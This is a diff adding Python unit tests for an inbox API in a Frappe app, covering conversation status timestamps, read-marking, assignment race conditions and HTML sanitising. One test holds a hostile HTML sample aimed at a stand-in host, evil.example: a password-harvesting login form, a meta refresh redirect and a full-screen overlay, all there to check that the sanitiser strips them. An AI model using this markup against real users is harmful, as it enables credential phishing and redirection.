@@ -1,4 +1,5 @@
 from datetime import timedelta
+from unittest.mock import patch
 
 import frappe
 from frappe.utils import get_datetime, now_datetime
@@ -270,6 +271,7 @@ class TestInboxApi(DialogBrainTestCase):
 	# --- actions ----------------------------------------------------------
 
 	def test_close_and_reopen_set_timestamps(self):
+		frappe.db.set_value("DB Conversation", self.a_open_unassigned, "first_response_seconds", 42)
 		frappe.set_user(self.agent_a)
 		api.set_status(self.a_open_unassigned, "Closed")
 		conv = frappe.db.get_value(
@@ -279,9 +281,13 @@ class TestInboxApi(DialogBrainTestCase):
 		self.assertTrue(conv.closed_at)
 		api.set_status(self.a_open_unassigned, "Open")
 		conv = frappe.db.get_value(
-			"DB Conversation", self.a_open_unassigned, ["status", "closed_at", "opened_at"], as_dict=True
+			"DB Conversation",
+			self.a_open_unassigned,
+			["status", "closed_at", "opened_at", "first_response_seconds"],
+			as_dict=True,
 		)
 		self.assertEqual(conv.status, "Open")
+		self.assertEqual(conv.first_response_seconds, 0)  # R1: "not measured yet"
 		self.assertIsNone(conv.closed_at)
 		self.assertGreater(get_datetime(conv.opened_at), now_datetime() - timedelta(minutes=1))
 		with self.assertRaises(frappe.ValidationError):
@@ -291,6 +297,57 @@ class TestInboxApi(DialogBrainTestCase):
 		frappe.set_user(self.agent_a)
 		api.set_status(self.a_open_mine, "Closed")
 		self.assertEqual(frappe.db.get_value("DB Conversation", self.a_open_mine, "needs_human"), 0)
+
+	def test_mark_read_publishes_only_when_unread(self):
+		"""R2: write + publish only when unread_count > 0."""
+		frappe.set_user(self.agent_a)
+		with patch("dialogbrain.api.conversations.publish") as pub:
+			api.mark_read(self.a_open_unassigned)  # unread_count 2
+			self.assertEqual(pub.call_count, 1)
+			self.assertEqual(pub.call_args.args[:2], (self.a_open_unassigned, "conversation"))
+		with patch("dialogbrain.api.conversations.publish") as pub:
+			api.mark_read(self.a_open_unassigned)  # now 0
+			api.mark_read(self.a_open_mine)  # 0 from the start
+			pub.assert_not_called()
+
+	def test_assign_race_loser_refused(self):
+		"""R4: another agent takes the conversation between our check and our write."""
+		real = api.permitted_users
+
+		def colleague_wins(channel):
+			frappe.db.sql(
+				"UPDATE `tabDB Conversation` SET assigned_to = %s WHERE name = %s",
+				(self.agent_b, self.a_open_unassigned),
+			)
+			return real(channel)
+
+		frappe.set_user(self.agent_a)
+		with patch("dialogbrain.api.conversations.permitted_users", side_effect=colleague_wins):
+			with self.assertRaises(frappe.PermissionError):
+				api.assign(self.a_open_unassigned, self.agent_a)
+		self.assertEqual(
+			frappe.db.get_value("DB Conversation", self.a_open_unassigned, "assigned_to"), self.agent_b
+		)
+
+		# unassign race: a manager reassigns our conversation before our write
+		def manager_reassigns():
+			frappe.db.sql(
+				"UPDATE `tabDB Conversation` SET assigned_to = %s WHERE name = %s",
+				(self.agent_b, self.a_open_mine),
+			)
+
+		orig_get_value = frappe.db.get_value
+
+		def get_value(*args, **kwargs):
+			out = orig_get_value(*args, **kwargs)
+			if kwargs.get("for_update") and args[1] == self.a_open_mine:
+				manager_reassigns()
+			return out
+
+		with patch.object(frappe.db, "get_value", side_effect=get_value):
+			with self.assertRaises(frappe.PermissionError):
+				api.assign(self.a_open_mine, None)
+		self.assertEqual(frappe.db.get_value("DB Conversation", self.a_open_mine, "assigned_to"), self.agent_b)
 
 	def test_mark_read_zeroes_unread(self):
 		frappe.set_user(self.agent_a)
@@ -335,6 +392,27 @@ class TestInboxApi(DialogBrainTestCase):
 		self.assertNotIn("<", preview)
 		self.assertNotIn(">", preview)
 		self.assertEqual(api.get_conversation(self.a_open_mine)["last_message_preview"], preview)
+
+	def test_message_html_drops_forms_meta_and_styles(self):
+		"""R3: no phishing forms, no link/meta, no style attributes (overlays)."""
+		evil = (
+			'<link rel="stylesheet" href="https://evil.example/x.css">'
+			'<meta http-equiv="refresh" content="0;url=https://evil.example">'
+			'<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">'
+			'<form action="https://evil.example/login" method="post">'
+			'<input name="password" type="password"><select><option>a</option></select>'
+			'<textarea>t</textarea><button type="submit">Log in</button></form></div>'
+			'<iframe src="https://evil.example"></iframe><base href="https://evil.example/">'
+			'<p style="color:red">keep me</p><img src="https://cdn.example/a.png">'
+		)
+		_msg(self.a_open_mine, text=evil)
+		frappe.set_user(self.agent_a)
+		html = api.get_messages(self.a_open_mine)["rows"][0]["html"].lower()
+		for bad in ("<form", "<input", "<button", "<select", "<option", "<textarea", "<link",
+					"<meta", "<iframe", "<base", "style=", "position:fixed"):
+			self.assertNotIn(bad, html, bad)
+		self.assertIn("keep me", html)
+		self.assertIn('<img src="https://cdn.example/a.png"', html)
 
 	def test_message_rows_carry_client_ref(self):
 		name = _msg(
